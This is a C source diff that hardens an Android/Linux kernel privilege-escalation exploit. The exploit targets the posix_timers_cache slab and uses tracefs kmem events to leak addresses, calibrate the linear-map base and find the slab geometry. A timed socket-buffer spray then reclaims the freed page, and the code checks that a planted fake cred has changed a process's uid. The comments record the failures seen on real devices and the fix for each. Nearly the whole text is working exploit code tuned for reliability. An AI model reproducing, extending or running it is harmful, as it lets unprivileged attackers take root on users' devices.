@@ -681,6 +681,156 @@ static void slab_usage(const char *tag)
     fclose(f);
 }
 
+/*
+ * Read the *real* geometry of posix_timers_cache from /proc/slabinfo.
+ *
+ * This is the authoritative source when the shell can read it.  The
+ * kernel normally creates slabinfo 0400; Android may relax it to 0440
+ * root:log, but shell access also needs supplementary gid log and an
+ * SELinux allow for proc_slabinfo.  Tracefs metadata is a separate,
+ * commonly denied path.  The slabinfo columns are
+ *   name active_objs num_objs objsize objperslab pagesperslab
+ * so pagesperslab alone fixes the SLUB order, no voting required.
+ *
+ * Why this matters: calibrate_base()'s vote picks the order that makes the
+ * recorded slab pages line up, and that vote can be wrong.  A phone with 31
+ * objects per slab has order 1; if the vote returns order 0, SLAB_SIZE
+ * becomes 4096 while the kernel is really grouping 31 objects into 8192
+ * bytes.  Every offset derived from SLAB_MASK / SLAB_OFF_MASK is then wrong
+ * (the fake cred lands half a slab away from the node, the spray sends 4096
+ * where 8192 is needed), the plant "succeeds" and the child never changes
+ * uid.  That is exactly the `mode=fake ... agree=0 ... child woke uid=2000`
+ * failure: the trigger and the erase worked, the payload was in the wrong
+ * place.
+ *
+ * Returns 0 and fills the out-params on success, -1 when slabinfo is
+ * unreadable or the line does not parse.
+ */
+static int slabinfo_geometry(unsigned *out_order, unsigned long *out_size,
+                             unsigned long *out_objsize,
+                             unsigned long *out_objperslab)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char line[256];
+    int r = -1;
+
+    if (!f)
+        return -1;
+    while (fgets(line, sizeof(line), f))
+    {
+        char name[64];
+        unsigned long active = 0, total = 0, objsize = 0, objper = 0;
+        unsigned long pages = 0;
+
+        if (strncmp(line, "posix_timers_cache ", 19))
+            continue;
+        if (sscanf(line, "%63s %lu %lu %lu %lu %lu", name, &active, &total,
+                   &objsize, &objper, &pages) != 6)
+            break;
+        if (!pages || pages > 32)
+            break;
+        /* pagesperslab is a power of two; the exponent is the SLUB order. */
+        {
+            unsigned order = 0;
+
+            while ((1UL << order) < pages)
+                order++;
+            if ((1UL << order) != pages)
+                break;
+            *out_order = order;
+            *out_size = (unsigned long)getpagesize() << order;
+            *out_objsize = objsize;
+            *out_objperslab = objper;
+            r = 0;
+        }
+        break;
+    }
+    fclose(f);
+    return r;
+}
+
+/*
+ * Free objects currently parked in posix_timers_cache, i.e. how many
+ * timer_create() calls this boot can serve without asking SLUB for a new
+ * slab.  Calibration needs that number: see calibrate_base().
+ */
+static long slab_free_objects(void)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char line[256];
+    long r = -1;
+
+    if (!f)
+        return -1;
+    while (fgets(line, sizeof(line), f))
+    {
+        unsigned long active = 0, total = 0;
+
+        if (strncmp(line, "posix_timers_cache ", 19))
+            continue;
+        if (sscanf(line, "posix_timers_cache %lu %lu", &active, &total) == 2 &&
+            total >= active)
+            r = (long)(total - active);
+        break;
+    }
+    fclose(f);
+    return r;
+}
+
+/*
+ * Derive posix_timers_cache's SLUB order from timer allocation addresses
+ * alone, for the case where /proc/slabinfo is unreadable (the kernel creates
+ * it 0400 and Android may not relax the DAC mode for shell).  No root is
+ * involved either way: this uses only
+ * the shell-domain trace records the exploit already reads.
+ *
+ * The lowest set bit of a slab address is NOT the order: SLUB keeps the
+ * block's `struct slab` at the start of the first page, so objects begin
+ * after it and `ptr & -ptr` is a lower bound on the block size, never an
+ * upper one -- on the device that reported this bug it yields 0x1000 for a
+ * block that is really 0x2000.
+ *
+ * The reliable signal is the in-slab period.  Objects sit at
+ * page ->+#+0, +1*obj, +2*obj, ... with the same offset inside every page of
+ * the block, so an 8K slab with 31 objects leaves a cluster of this slab's
+ * addresses inside each 8K window (15 or 16 per 4K half), and an order-0
+ * slab shows the same periodicity inside 4K.  Score each candidate order by
+ * how many addresses are object-aligned within it.
+ */
+static unsigned derive_order_from_ptrs(const unsigned long long *ptrs,
+                                       int nrec, unsigned long long objsize)
+{
+    unsigned best_order = 0;
+    int best_score = -1;
+
+    if (!nrec || !objsize || objsize > ((unsigned long long)getpagesize() << 3))
+        return 0;
+
+    for (unsigned order = 0; order <= 3; order++)
+    {
+        unsigned long long size = (unsigned long long)getpagesize() << order;
+        unsigned long long per = size / objsize;
+        int aligned = 0;
+
+        if (!per || per > 1024)
+            continue;
+        for (int i = 0; i < nrec; i++)
+            if (((ptrs[i] & (size - 1)) % objsize) == 0)
+                aligned++;
+        /*
+         * Require near-total alignment: a 4K window on an 8K slab aligns
+         * only about half the addresses.  Prefer the largest order that
+         * qualifies, because an 8K block also satisfies the 4K test.
+         */
+        if (aligned * 20 >= nrec * 19 && aligned > best_score)
+        {
+            best_score = aligned;
+            best_order = order;
+        }
+    }
+    return best_order;
+}
+
 /* posix_timers_cache active object count, or -1 when unreadable. */
 static long slab_active(void)
 {
@@ -748,6 +898,35 @@ static void logf(const char *fmt, ...)
     }
 }
 
+/* Real uid as seen through /proc.  The zero plant writes cred->uid; reading
+ * it back is the only way to know the stale rb_erase actually ran on the
+ * payload, because a later reclaim of the same page can make run_plant()
+ * report success even when the write happened before the payload was in
+ * place. */
+static int proc_uid(pid_t pid)
+{
+    char path[64], buf[512];
+    int fd, n;
+    char *p;
+
+    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+        return -1;
+    n = (int)read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    buf[n] = 0;
+    p = strstr(buf, "\nUid:");
+    if (!p)
+        return -1;
+    p += 5;
+    while (*p == ' ' || *p == '\t')
+        p++;
+    return atoi(p);
+}
+
 static int wr(const char *p, const char *s)
 {
     int fd = open(p, O_WRONLY);
@@ -757,12 +936,49 @@ static int wr(const char *p, const char *s)
     close(fd);
     return r < 0 ? -1 : 0;
 }
-static void pin(int cpu)
+static int pin(int cpu)
 {
     cpu_set_t set;
     CPU_ZERO(&set);
     CPU_SET(cpu, &set);
-    sched_setaffinity(0, sizeof(set), &set);
+    return sched_setaffinity(0, sizeof(set), &set);
+}
+
+/*
+ * Pick the CPU the whole run traces on.
+ *
+ * Every capture reads one CPU's trace_pipe_raw, so the allocating process has
+ * to be pinned to that same CPU.  If sched_setaffinity() fails, the
+ * allocations happen elsewhere and read_cpu() returns a buffer they never
+ * touched, which reads exactly like a wrong profile (`site=0 count=0`) while
+ * the page-event discovery still succeeds from unrelated kernel activity.
+ * Vendor cpusets can deny the shell domain the CPU a profile assumes, so fall
+ * back to a CPU the mask actually allows instead of silently tracing the
+ * wrong one.
+ */
+static int pin_trigger_cpu(int want)
+{
+    cpu_set_t set;
+
+    if (!pin(want))
+        return want;
+    CPU_ZERO(&set);
+    if (sched_getaffinity(0, sizeof(set), &set) || !CPU_COUNT(&set))
+    {
+        logf("[!] cannot pin to cpu %d (%s) and cannot read the allowed set; "
+             "tracing cpu %d anyway\n", want, strerror(errno), want);
+        return want;
+    }
+    for (int c = 0; c < CPU_SETSIZE; c++)
+        if (CPU_ISSET(c, &set) && !pin(c))
+        {
+            logf("[!] cannot pin to cpu %d (%s); the allowed set has cpu %d, "
+                 "tracing there instead\n", want, strerror(errno), c);
+            return c;
+        }
+    logf("[!] cannot pin to cpu %d (%s); no allowed cpu accepted the "
+         "affinity, tracing cpu %d anyway\n", want, strerror(errno), want);
+    return want;
 }
 static unsigned u32(const unsigned char *b, size_t o)
 {
@@ -777,15 +993,53 @@ static unsigned long long u64(const unsigned char *b, size_t o)
     return v;
 }
 
+static int rd_file(const char *path, char *buf, size_t cap)
+{
+    int fd = open(path, O_RDONLY);
+    ssize_t r;
+
+    if (fd < 0)
+        return -1;
+    r = read(fd, buf, cap - 1);
+    close(fd);
+    if (r < 0)
+        return -1;
+    buf[r] = 0;
+    return (int)r;
+}
+
+/*
+ * Enable the three kmem events the exploit reads.
+ *
+ * The rss_stat trigger is the documented single-write path, but a failed
+ * write there is silent.  A run that ends up with the page events on and
+ * kmem_cache_alloc off still discovers the page event ids and then reports
+ * `site=0 count=0`, which is indistinguishable from a wrong timer_site.  Read
+ * every event back and fall back to its own `enable` file, naming any event
+ * that stays off.
+ */
 static void enable_events(void)
 {
     static const char *evs[] = {
-        "enable_event:kmem:kmem_cache_alloc\n",
-        "enable_event:kmem:mm_page_free\n",
-        "enable_event:kmem:mm_page_alloc\n",
+        "kmem_cache_alloc",
+        "mm_page_free",
+        "mm_page_alloc",
     };
+
     for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
-        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
+    {
+        char path[192], cmd[128], val[16];
+
+        snprintf(cmd, sizeof(cmd), "enable_event:kmem:%s\n", evs[i]);
+        wr(TR "/events/kmem/rss_stat/trigger", cmd);
+        snprintf(path, sizeof(path), TR "/events/kmem/%s/enable", evs[i]);
+        if (rd_file(path, val, sizeof(val)) > 0 && val[0] == '1')
+            continue;
+        wr(path, "1");
+        if (rd_file(path, val, sizeof(val)) <= 0 || val[0] != '1')
+            logf("[!] kmem:%s is not enabled (%s); captures that need it "
+                 "will read nothing\n", evs[i], path);
+    }
 }
 
 static void drain_cpu(int cpu)
@@ -913,6 +1167,93 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
             out[cnt++] = ptr;
     }
     return cnt;
+}
+
+/*
+ * What a failed timer scan actually saw.
+ *
+ * scan_timer_allocs() rejects every record whose call_site low21 differs from
+ * the profile.  That is the right call for the exploit itself, because the
+ * same value is the slide anchor, but it leaves a device with the right slab
+ * geometry and a different kernel text with nothing but `site=0 count=0`.
+ * This second pass drops the site filter so the log can tell the three cases
+ * apart: the event never recorded, the object size is different, or the
+ * profile call site is wrong (and then which call sites the kernel did use).
+ */
+static void explain_timer_scan(const unsigned char *b, size_t n, int pid)
+{
+    enum { MAXK = 64 };
+    unsigned long long key[MAXK];
+    int cnt[MAXK];
+    int nk = 0, total = 0, sized = 0;
+
+    for (size_t i = 8; i + 40 <= n; i += 4)
+    {
+        unsigned long long site, ptr, req, alloc;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        site = u64(b, i);
+        ptr = u64(b, i + 8);
+        if (!is_kernel_ptr(site) || !is_kernel_ptr(ptr))
+            continue;
+        req = u64(b, i + ALLOC_REQ_OFF);
+        alloc = u64(b, i + ALLOC_REQ_OFF + 8);
+        if (!alloc || alloc < req)
+            continue;
+        total++;
+        if (req != TIMER_ALLOC || alloc != TIMER_ALLOC)
+            continue;
+        sized++;
+        for (int k = 0; k < nk; k++)
+            if (key[k] == site)
+            {
+                cnt[k]++;
+                goto next;
+            }
+        if (nk < MAXK)
+        {
+            key[nk] = site;
+            cnt[nk] = 1;
+            nk++;
+        }
+    next:;
+    }
+
+    if (!total)
+    {
+        logf("[-] the trace holds no kmem_cache_alloc record for pid %d; the "
+             "kmem:kmem_cache_alloc event is not recording on this kernel\n",
+             pid);
+        return;
+    }
+    if (!sized)
+    {
+        logf("[-] %d kmem_cache_alloc records for pid %d, none with bytes_req "
+             "== bytes_alloc == %#llx; posix_timers_cache has a different "
+             "object size here than the profile\n", total, pid,
+             (unsigned long long)TIMER_ALLOC);
+        return;
+    }
+    logf("[-] %d of %d kmem_cache_alloc records are %#llx-byte slab "
+         "allocations, but no call_site has low21 %#llx (conf timer_site="
+         "%#llx)\n", sized, total, (unsigned long long)TIMER_ALLOC,
+         TIMER_SITE_LOW21, STATIC_TIMER_SITE);
+    for (int k = 0; k < nk && k < 4; k++)
+    {
+        int best = -1;
+
+        for (int j = 0; j < nk; j++)
+            if (cnt[j] > 0 && (best < 0 || cnt[j] > cnt[best]))
+                best = j;
+        if (best < 0)
+            break;
+        logf("[-]   observed call_site=%#llx low21=%#llx count=%d\n", key[best],
+             key[best] & 0x1fffffULL, cnt[best]);
+        cnt[best] = -1;
+    }
+    logf("[-] this kernel's text layout differs from the profile's; timer_site "
+         "must be re-derived from this device's boot.img\n");
 }
 
 static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
@@ -1057,6 +1398,12 @@ static int discover_page_types(unsigned char *raw)
         {
             pairs[np].pfn = pfn;
             pairs[np].alloc_type = type;
+            /* A pfn whose free record never lands inside the capture window
+             * must stay ineligible for selection.  Without this, free_type
+             * holds stack garbage, the `alloc_type != free_type` test passes,
+             * and the garbage is reported as page_free -- which leaves
+             * scan_reclaim() watching an event that never fires. */
+            pairs[np].free_type = 0;
             pairs[np].hits = 1;
             np++;
         }
@@ -1180,14 +1527,142 @@ static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
     return best_cnt >= 8 ? best_base : 0;
 }
 
-static unsigned long long calibrate_base(unsigned char *raw)
+/*
+ * Vote the linear-map base for one candidate slab geometry.  The configured
+ * slab_order/slab_size is only a profile hint: SLUB derives the real order
+ * from the device's possible-CPU count, so a phone can differ from the QEMU
+ * boot used to validate the profile even on the same kernel.  calibrate_base()
+ * runs this for each order and keeps the geometry with the strongest vote.
+ */
+static unsigned long long vote_base(const unsigned char *b, size_t n, int pid,
+                                    const unsigned long long *ptrs, int nrec,
+                                    unsigned order, unsigned long long size,
+                                    unsigned long long *out_count)
 {
     unsigned long long hist[64] = {0}, hcnt[64] = {0};
     unsigned long long recent[64];
+    unsigned long long mask = ~(size - 1);
+    unsigned long long best = 0, bestc = 0;
+    int hc = 0, rn = 0;
+
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        unsigned long long pfn = u64(b, i);
+
+        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != (int)order ||
+            u32(b, i - 4) != (unsigned)pid ||
+            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        if (rn == 64)
+            memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
+        recent[rn++] = pfn;
+    }
+    for (int i = 0; i < nrec; i++)
+    {
+        unsigned long long slab = ptrs[i] & mask;
+
+        for (int j = 0; j < rn; j++)
+        {
+            unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
+            int f = 0;
+
+            for (int k = 0; k < hc; k++)
+                if (hist[k] == base)
+                {
+                    hcnt[k]++;
+                    f = 1;
+                    break;
+                }
+            /*
+             * A candidate that does not fit must still be counted: the
+             * previous version dropped every vote past the 64th distinct
+             * key, so on a busy allocator the true base (which arrives
+             * early, from the dense run of *this* slab) could lose to a
+             * spurious key that kept getting recounts.  Evict the weakest
+             * entry instead of ignoring the vote.
+             */
+            if (!f)
+            {
+                if (hc < 64)
+                {
+                    hist[hc] = base;
+                    hcnt[hc] = 1;
+                    hc++;
+                }
+                else
+                {
+                    int min_k = 0;
+
+                    for (int k = 1; k < hc; k++)
+                        if (hcnt[k] < hcnt[min_k])
+                            min_k = k;
+                    if (hcnt[min_k] == 1)
+                        continue; /* nothing worth evicting */
+                    hist[min_k] = base;
+                    hcnt[min_k] = 1;
+                }
+            }
+        }
+    }
+    for (int k = 0; k < hc; k++)
+        if (hcnt[k] > bestc)
+        {
+            bestc = hcnt[k];
+            best = hist[k];
+        }
+    *out_count = bestc;
+    return best;
+}
+
+static unsigned long long calibrate_base(unsigned char *raw)
+{
     unsigned long long ptrs[512];
     unsigned long long site0 = 0;
-    int hc = 0, rn = 0, made = 0, me = getpid();
+    int made = 0, me = getpid();
     long n;
+    long free_objs = slab_free_objects();
+
+    /*
+     * Fill every object SLUB is already holding before the measured burst.
+     *
+     * The base vote pairs a timer slab with the mm_page_alloc that created
+     * it, so it can only see slabs allocated *during* the window.  A warm
+     * cache breaks that: after any earlier exploit run, posix_timers_cache
+     * has free objects in existing slabs, so timer_create() hands those out
+     * and SLUB allocates nothing.  The vote then sees only the handful of
+     * pages that happen to be needed, which on this device is the classic
+     * `count=31 order=0` (one 8K slab's worth of allocations still produced
+     * a few 4K page events), instead of the `count=483 order=1` a cold
+     * cache gives.  Consuming the free objects first restores the cold
+     * profile, so the order that wins is the real one.
+     *
+     * The throwaway timers are never deleted: their objects stay owned by
+     * this process for the rest of the run, which is exactly what the
+     * exploit wants anyway (it pre-fills 4096 more later).
+     */
+    if (free_objs > 0 && free_objs < 1 << 20)
+    {
+        timer_t *drain = calloc((size_t)free_objs + 8, sizeof(*drain));
+        int n_d = 0;
+
+        if (drain)
+        {
+            struct sigevent ev;
+
+            memset(&ev, 0, sizeof(ev));
+            ev.sigev_notify = SIGEV_NONE;
+            for (long i = 0; i < free_objs + 8; i++)
+            {
+                if (timer_create(CLOCK_MONOTONIC, &ev, &drain[n_d]))
+                    break;
+                n_d++;
+            }
+            logf("[base] drained %d free timers (slab free was %ld)\n", n_d,
+                 free_objs);
+            /* Keep the array: the objects must stay allocated, so it is
+             * deliberately not freed. */
+        }
+    }
 
     trace_start();
     for (int i = 0; i < 512; i++)
@@ -1209,55 +1684,155 @@ static unsigned long long calibrate_base(unsigned char *raw)
 
     {
         int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, &site0);
-
-        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
-        {
-            unsigned long long pfn = u64(raw, i);
-
-            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != (int)SLAB_ORDER ||
-                u32(raw, i - 4) != (unsigned)me ||
-                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
-                continue;
-            if (rn == 64)
-                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
-            recent[rn++] = pfn;
-        }
-        for (int i = 0; i < c; i++)
-        {
-            unsigned long long slab = ptrs[i] & SLAB_MASK;
-
-            for (int j = 0; j < rn; j++)
-            {
-                unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
-                int f = 0;
-
-                for (int k = 0; k < hc; k++)
-                    if (hist[k] == base)
-                    {
-                        hcnt[k]++;
-                        f = 1;
-                        break;
-                    }
-                if (!f && hc < 64)
-                {
-                    hist[hc] = base;
-                    hcnt[hc] = 1;
-                    hc++;
-                }
-            }
-        }
-    }
-    {
         unsigned long long best = 0, bestc = 0;
+        unsigned best_order = SLAB_ORDER;
+        unsigned long long best_size = SLAB_SIZE;
+        unsigned si_order = 0;
+        unsigned long si_size = 0, si_obj = 0, si_per = 0;
+        int have_si = slabinfo_geometry(&si_order, &si_size, &si_obj,
+                                        &si_per) == 0;
 
-        for (int k = 0; k < hc; k++)
-            if (hcnt[k] > bestc)
+        if (c == 0)
+            explain_timer_scan(raw, (size_t)n, me);
+
+        /*
+         * /proc/slabinfo is authoritative when it is readable: pagesperslab
+         * states the SLUB order outright, while the vote below only infers
+         * it and has been observed to lock onto the wrong exponent (order 0
+         * on a 31-object order-1 slab), which silently shifts every offset
+         * by half a slab.  Use it directly and keep the vote for the case
+         * where slabinfo is not readable.
+         */
+        if (have_si && si_size && si_order <= 3)
+        {
+            if ((unsigned long long)si_size != SLAB_SIZE ||
+                si_order != (unsigned)SLAB_ORDER)
             {
-                bestc = hcnt[k];
-                best = hist[k];
+                logf("[!] slab geometry mismatch: conf order=%u size=%#llx, "
+                     "slabinfo order=%u size=%#lx (obj=%lu per=%lu); "
+                     "using slabinfo geometry\n",
+                     SLAB_ORDER, (unsigned long long)SLAB_SIZE, si_order,
+                     si_size, si_obj, si_per);
+                g_cfg.slab_order = si_order;
+                g_cfg.slab_size = si_size;
             }
-        logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu\n",
-             made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc);
+            else
+                logf("[+] slab geometry confirmed by slabinfo: order=%u "
+                     "size=%#lx obj=%lu per=%lu\n", si_order, si_size,
+                     si_obj, si_per);
+            best_order = si_order;
+            best_size = si_size;
+        }
+        if (have_si && si_obj && si_obj != (unsigned long)TIMER_ALLOC)
+            logf("[!] posix_timers_cache objsize=%lu but conf timer_alloc="
+                 "%#llx; the profile is wrong for this kernel\n", si_obj,
+                 (unsigned long long)TIMER_ALLOC);
+        /*
+         * No slabinfo: derive the order from the captured addresses instead
+         * of trusting a vote.  This keeps the run working when userspace
+         * leaves the file 0400 or another access-chain link denies shell.
+         */
+        if (!have_si && c > 0)
+        {
+            unsigned d_order = derive_order_from_ptrs(ptrs, c, TIMER_ALLOC);
+            unsigned long long d_size =
+                (unsigned long long)PAGE << d_order;
+
+            if (d_order != (unsigned)SLAB_ORDER)
+                logf("[!] slabinfo unreadable; address periodicity says "
+                     "order=%u size=%#llx, conf says order=%u size=%#llx; "
+                     "using the derived geometry\n", d_order, d_size,
+                     SLAB_ORDER, (unsigned long long)SLAB_SIZE);
+            else
+                logf("[+] slabinfo unreadable; address periodicity confirms "
+                     "order=%u size=%#llx\n", d_order, d_size);
+            g_cfg.slab_order = d_order;
+            g_cfg.slab_size = d_size;
+            best_order = d_order;
+            best_size = d_size;
+        }
+
+        for (unsigned order = 0; order <= 3; order++)
+        {
+            unsigned long long size = (unsigned long long)PAGE << order;
+            unsigned long long cnt = 0;
+            unsigned long long base = vote_base(raw, (size_t)n, me, ptrs, c,
+                                                order, size, &cnt);
+
+            /*
+             * With slabinfo in hand, only accept the vote for the real
+             * geometry; a stronger vote for another order is the very
+             * mistake this guard exists to reject.
+             */
+            if (have_si && si_size && order != si_order)
+                continue;
+            if (cnt > bestc)
+            {
+                best = base;
+                bestc = cnt;
+                best_order = order;
+                best_size = size;
+            }
+        }
+        /*
+         * Fall back to a vote on *any* order when the real geometry produced
+         * none.  This happens if the drain above could not force new slabs
+         * (a very small or very full cache): the geometry stays whatever
+         * slabinfo said, and only the linear-map base is borrowed from
+         * another order's pairing.  The base is a property of the direct map,
+         * not of the slab, so a base voted at the wrong order is still the
+         * right base once a slab was matched at all; using it is strictly
+         * better than failing calibration and never reaching a plant.
+         */
+        if (bestc < 4 && have_si)
+        {
+            for (unsigned order = 0; order <= 3; order++)
+            {
+                unsigned long long size = (unsigned long long)PAGE << order;
+                unsigned long long cnt = 0;
+                unsigned long long base =
+                    vote_base(raw, (size_t)n, me, ptrs, c, order, size, &cnt);
+                int agree = 0;
+
+                if (cnt <= bestc)
+                    continue;
+                if (!(have_si && si_size) || order == si_order)
+                    agree = 1;
+                if (!agree)
+                    logf("[!] base fallback: order=%u votes=%llu while the "
+                         "real slab order is %u; using the base only\n",
+                         order, cnt, si_order);
+                best = base;
+                bestc = cnt;
+            }
+        }
+        if (best < LINEAR_MIN || best > LINEAR_MAX)
+            bestc = 0;
+        if (!have_si && bestc >= 4 &&
+            (best_order != SLAB_ORDER || best_size != SLAB_SIZE))
+        {
+            logf("[!] slab geometry mismatch: conf order=%u size=%#llx, "
+                 "vote order=%u size=%#llx; using voted geometry\n",
+                 SLAB_ORDER, (unsigned long long)SLAB_SIZE, best_order,
+                 best_size);
+            g_cfg.slab_order = best_order;
+            g_cfg.slab_size = best_size;
+        }
+        logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu "
+             "order=%u size=%#llx\n",
+             made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc,
+             best_order, best_size);
+        /*
+         * The base is a physical-page anchor, not just a diagnostic: when
+         * pair_slab_pfn() finds no positional page, run_plant() derives the
+         * victim pfn as (V - g_base) >> PAGE_SHIFT and writes there.  A vote
+         * of 1..3 pairs cannot be told apart from a coincidental (slab, page)
+         * pairing, so a slabinfo-confirmed geometry does NOT make such a base
+         * safe to use -- only the geometry is confirmed, never the pairing.
+         * Fail calibration instead; plant_base() (floor 8) recomputes the base
+         * from the real capture on every plant and is the path that is meant
+         * to survive a warm cache.
+         */
         if (bestc < 4)
             return 0;
         /*
@@ -1835,9 +2410,25 @@ static int stage_write(unsigned long long target, int mode,
 
 #define SPRAY_THREADS 8
 #define SPRAY_SOCKS 2048
-#define SPRAY_PRE 2000
-#define SPRAY_POST 10000
+/*
+ * Phase 1 pre-fills a small part of the pool before the target execs, which
+ * catches a free that happens early.  It must stay small: it consumes the
+ * same bounded queue capacity that the phase-2 burst needs at the free.
+ */
+#define SPRAY_PRE 256
+/* Phase-2 send budget per spray thread, spent once the free is observed. */
+#define SPRAY_POST 20000
+/* How long phase 2 waits for the parent's page_free before giving up. */
+#define SPRAY_WINDOW_MS 14000
 static _Atomic int g_burst, g_burst2, g_stop_spray;
+/* Set by the parent the moment page_free for the victim slab appears in the
+ * trace.  The spray holds its queue capacity until this is set and only then
+ * spends it, so the budget is still unused when the page becomes available.
+ */
+static _Atomic int g_free_seen;
+/* Spray accounting, logged once per plant: a burst that silently mostly
+ * failed (EAGAIN/ENOBUFS) cannot reclaim anything no matter how long it runs. */
+static _Atomic long g_send_ok, g_send_err;
 /*
  * Two spray pools.  pool_a is the scratch pool until the fake-cred stage
  * lands; its queued skbuffs then hold the page the child's cred points
@@ -1987,6 +2578,84 @@ static void scan_reclaim(const unsigned char *b, size_t n,
     }
 }
 
+/*
+ * Drain every per-CPU raw ring continuously while a plant is racing.
+ *
+ * The previous code only read trace_pipe_raw after wait_zombie() and the PCP
+ * slabinfo wait had finished.  On a busy device those waits can take seconds
+ * (see the 3843ms pcp reclaim on the hardware log), while the exec'd image and
+ * the spray keep filling the rings.  That loses the evidence in one of two
+ * ways, both seen on the 6.1.172 hardware:
+ *   - free_seen=0: the victim's mm_page_free is overwritten before it is read,
+ *     so phase 2 waits its whole 14s window and bursts long after the page is
+ *     gone;
+ *   - free_seen=1, hit=0: the reclaim page_alloc is overwritten before the
+ *     scanner knows about the free, so a successful reclaim is reported as a
+ *     miss and the zombie is never reaped.
+ *
+ * Draining in the background from trace_start() until the plant ends keeps the
+ * free -> reclaim pair together and lets phase 2 start at the first sign of
+ * the free instead of a second too late.
+ */
+struct reclaim_watch
+{
+    unsigned char *raw;
+    unsigned long long pfn;
+    _Atomic int stop;
+    /*
+     * Set by the parent when the PCP slabinfo gate confirms the victim's
+     * timers were freed.  On these kernels the page can leave through the PCP
+     * lists without an mm_page_free that reaches tracefs, so the slab-count
+     * drop is the authoritative free signal, not a secondary confirmation.
+     */
+    _Atomic int force_free;
+    _Atomic int free_seen;
+    _Atomic int hit;
+    long free_ms;
+    long start_ms;
+};
+
+static void *reclaim_watcher(void *x)
+{
+    struct reclaim_watch *w = x;
+    int free = 0, hit = 0;
+
+    while (!atomic_load(&w->stop) && !atomic_load(&g_stop_spray) && !hit)
+    {
+        if (atomic_load(&w->force_free) && !free)
+        {
+            free = 1;
+            w->free_ms = now_ms() - w->start_ms;
+            atomic_store(&w->free_seen, 1);
+            atomic_store(&g_free_seen, 1);
+        }
+        for (int cpu = 0; cpu < 8 && !hit; cpu++)
+        {
+            long m = read_fd(g_rawfd[cpu], w->raw, 32u << 20);
+
+            if (m <= 0)
+                continue;
+            scan_reclaim(w->raw, (size_t)m, w->pfn, &free, &hit);
+            if (free && !atomic_load(&w->free_seen))
+            {
+                w->free_ms = now_ms() - w->start_ms;
+                atomic_store(&w->free_seen, 1);
+                atomic_store(&g_free_seen, 1);
+            }
+        }
+        if (!hit)
+            usleep(50);
+    }
+    atomic_store(&w->hit, hit);
+    return NULL;
+}
+
+static void stop_watch(struct reclaim_watch *w, pthread_t th)
+{
+    atomic_store(&w->stop, 1);
+    pthread_join(th, NULL);
+}
+
 static void *spray_thread(void *x)
 {
     struct spray_arg *a = x;
@@ -2015,18 +2684,49 @@ static void *spray_thread(void *x)
     {
         int k = a->sock_first + (w % a->sock_count);
 
-        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
+        if (send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT) > 0)
+            atomic_fetch_add(&g_send_ok, 1);
+        else
+            atomic_fetch_add(&g_send_err, 1);
         w++;
     }
-    /* Phase 2 is released when the parent sees the victim page free. */
+    /*
+     * Phase 2 is the reclaim burst, and its timing is the whole trick.
+     *
+     * The queues hold a finite amount of payload.  An unprivileged process
+     * cannot raise net.core.wmem_max, so the pool keeps only a bounded number
+     * of skbs (measured on a boot with Android's 212992 default: successful
+     * sends stall around 57k, everything after that is EAGAIN).  Sending flat
+     * out therefore spends the entire capacity within a few milliseconds,
+     * while the victim slab is freed later, inside the child's exec/exit
+     * path.  By then every send fails and nothing of ours is allocating, so
+     * the page goes elsewhere: that was the hardware miss, `free_seen=1
+     * hit=0` with send errors in the millions.
+     *
+     * So hold the capacity back.  Wait until the parent has seen page_free
+     * for the victim slab, then spend the whole remaining budget at full
+     * speed.  The free is the only instant at which the page can be taken,
+     * and the parent stops the spray (g_stop_spray) as soon as it proves the
+     * reclaim, so a hit ends this early.
+     */
     while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
         sched_yield();
-    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
     {
-        int k = a->sock_first + (w % a->sock_count);
+        long t0 = now_ms();
 
-        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
-        w++;
+        while (!atomic_load(&g_free_seen) && !atomic_load(&g_stop_spray) &&
+               now_ms() - t0 < SPRAY_WINDOW_MS)
+            usleep(200);
+        while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
+        {
+            int k = a->sock_first + (w % a->sock_count);
+
+            if (send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT) > 0)
+                atomic_fetch_add(&g_send_ok, 1);
+            else
+                atomic_fetch_add(&g_send_err, 1);
+            w++;
+        }
     }
     return NULL;
 }
@@ -2039,9 +2739,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
     long slab_base = -1;
     unsigned char *payload = NULL;
     pthread_t th[SPRAY_THREADS];
+    pthread_t watch_th;
     struct spray_arg args[SPRAY_THREADS];
+    struct reclaim_watch watch;
     int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
     memset(res, 0, sizeof(*res));
+    memset(&watch, 0, sizeof(watch));
     /* stage_write resets the pool per attempt; direct callers arrive with
      * the run-long pool already filled, so this is a no-op there. */
     pool_fill();
